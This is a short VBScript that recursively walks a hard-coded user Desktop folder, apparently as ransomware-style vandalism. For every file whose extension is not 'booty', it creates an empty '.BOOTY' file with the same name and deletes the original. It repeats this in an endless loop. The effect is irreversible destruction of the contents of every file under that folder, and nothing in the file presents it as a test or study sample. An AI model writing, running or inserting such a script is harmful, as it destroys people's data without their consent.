' Declare variables
count = 0 
Dim objFSO, objParentFolder, objFolder, objFile, ext
' Set the parent directory to be processed
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objParentFolder = objFSO.GetFolder("C:\Users\s.matthew.kingery\Desktop")

' Function to process the subfolders
Sub ProcessSubFolders(folder)
    ' Loop through all files in the folder
    For Each objFile In folder.Files
ext = objFSO.GetExtensionName(objFile.path)
    ext = lcase(ext)
If NOT ext = "booty" Then
	objFSO.CreateTextFile(objFile.path & ".BOOTY")
	objFSO.DeleteFile(objFile.path)
End If
count = count + 1
    Next

    ' Loop through all subfolders
    For Each objFolder In folder.SubFolders
        ProcessSubFolders(objFolder)
    Next
End Sub

do
ProcessSubFolders(objParentFolder)
loop
' Clean up
Set objFile = Nothing
Set objParentFolder = Nothing
Set objFSO = Nothing